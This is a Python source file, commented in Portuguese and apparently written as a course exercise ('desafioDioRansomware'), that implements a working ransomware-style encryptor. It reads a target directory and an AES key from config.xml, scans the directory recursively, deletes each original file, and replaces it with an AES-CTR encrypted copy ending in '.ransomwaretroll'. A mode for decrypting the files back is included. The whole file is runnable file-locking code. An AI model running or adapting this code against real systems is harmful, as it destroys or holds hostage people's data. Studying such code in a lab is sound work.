import sys
import os
import xml.etree.ElementTree as ET
from pathlib import Path
import pyaes

def ler_config_xml(xml_path):
    """
    Lê um arquivo XML e retorna o caminho de varredura (scan_path), 
    se a varredura é recursiva (recursive) e a chave de criptografia (crypto_key).

    Parâmetros:
      xml_path (str): Caminho para o arquivo XML de configuração.

    Retorna:
      tuple: (scan_path, recursive, crypto_key)
    """
    tree = ET.parse(xml_path)
    root = tree.getroot()

    # <scanPath>
    scan_path_element = root.find('scanPath')
    if scan_path_element is None:
        raise ValueError("O XML não possui a tag <scanPath>.")
    scan_path = scan_path_element.text.strip()

    # <recursive>
    recursive_element = root.find('recursive')
    if recursive_element is None:
        raise ValueError("O XML não possui a tag <recursive>.")
    recursive = (recursive_element.text.strip().lower() == 'true')

    # <cryptoKey>
    crypto_key_element = root.find('cryptoKey')
    if crypto_key_element is None:
        raise ValueError("O XML não possui a tag <cryptoKey>.")
    # Converte a chave para bytes
    crypto_key = crypto_key_element.text.strip().encode('utf-8')

    return scan_path, recursive, crypto_key

def encrypt(file_name: str, key: bytes):
    """
    Criptografa um arquivo usando pyaes, remove o arquivo original
    e cria um novo arquivo com extensão .ransomwaretroll.

    Parâmetros:
      file_name (str): Caminho do arquivo a ser criptografado.
      key (bytes): Chave de criptografia (AES).
    """
    # Lê o conteúdo do arquivo original em modo binário
    with open(file_name, "rb") as f:
        file_data = f.read()

    # Remove o arquivo original
    os.remove(file_name)

    # Criptografa o conteúdo com AES (CTR)
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Cria o novo arquivo criptografado com extensão .ransomwaretroll
    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)
    
    print(f"[ENCRYPT] Arquivo criptografado: {new_file_name}")

def decrypt(file_name: str, key: bytes):
    """
    Descriptografa um arquivo usando pyaes, remove o arquivo original
    e cria um novo arquivo descriptografado (removendo o sufixo .ransomwaretroll).

    Parâmetros:
      file_name (str): Caminho do arquivo criptografado.
      key (bytes): Chave de descriptografia para AES.
    """
    with open(file_name, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    decrypt_data = aes.decrypt(file_data)

    # Remove o arquivo original
    os.remove(file_name)

    # Gera o nome do arquivo descriptografado removendo .ransomwaretroll
    new_file_name = file_name.replace(".ransomwaretroll", "")

    with open(new_file_name, "wb") as new_file:
        new_file.write(decrypt_data)
    
    print(f"[DECRYPT] Arquivo descriptografado: {new_file_name}")

def varrer_diretorio_por_config(xml_path, mode="list"):
    """
    Lê as configurações do arquivo XML e realiza a varredura do diretório.
    
    - Ignora o script atual e o próprio arquivo de configuração XML.
    - Exibe o caminho completo de cada arquivo encontrado.
    - Se mode="encrypt", criptografa todos os arquivos sem a extensão .ransomwaretroll.
    - Se mode="decrypt", descriptografa todos os arquivos que tiverem a extensão .ransomwaretroll.
    - Se mode="list" (padrão), apenas lista.

    Parâmetros:
      xml_path (str): Caminho para o arquivo XML de configuração.
      mode (str): Pode ser "list", "encrypt" ou "decrypt".
    """
    scan_path, recursive, crypto_key = ler_config_xml(xml_path)
    p = Path(scan_path)

    # Caminho absoluto do script atual
    current_script = Path(__file__).resolve()
    # Caminho absoluto do arquivo de configuração
    config_file = Path(xml_path).resolve()

    # Iteramos recursivamente se <recursive> estiver como 'true'
    items = p.rglob('*') if recursive else p.glob('*')

    for item in items:
        # Ignora o próprio script e o arquivo de configuração
        if item.resolve() == current_script or item.resolve() == config_file:
            continue

        if item.is_file():
            print(f"Encontrado: {item.resolve()}")
            
            # ENCRYPT MODE: Criptografa arquivos que não tiverem a extensão .ransomwaretroll
            if mode.lower() == "encrypt" and item.suffix != ".ransomwaretroll":
                encrypt(str(item.resolve()), crypto_key)
            
            # DECRYPT MODE: Descriptografa arquivos que tiverem a extensão .ransomwaretroll
            elif mode.lower() == "decrypt" and item.suffix == ".ransomwaretroll":
                decrypt(str(item.resolve()), crypto_key)

def main():
    # Seu arquivo de configuração
    config_path = "config.xml"

    # Verifica argumentos de linha de comando
    # Exemplo de uso:
    #   python desafioDioRansomware.py                 -> apenas lista arquivos
    #   python desafioDioRansomware.py encrypt         -> criptografa
    #   python desafioDioRansomware.py decrypt         -> descriptografa
    args = sys.argv

    if len(args) > 1:
        mode = args[1].lower()
        if mode == "encrypt":
            print("[INFO] Modo de CRIPTOGRAFIA ativado.")
            varrer_diretorio_por_config(config_path, mode="encrypt")
        elif mode == "decrypt":
            print("[INFO] Modo de DESCRIPTOGRAFIA ativado.")
            varrer_diretorio_por_config(config_path, mode="decrypt")
        else:
            print(f"[INFO] Parâmetro '{args[1]}' não reconhecido. Usando modo de LISTAGEM.")
            varrer_diretorio_por_config(config_path, mode="list")
    else:
        print("[INFO] Nenhum parâmetro informado. Listando apenas os arquivos encontrados.")
        varrer_diretorio_por_config(config_path, mode="list")

if __name__ == "__main__":
    main()
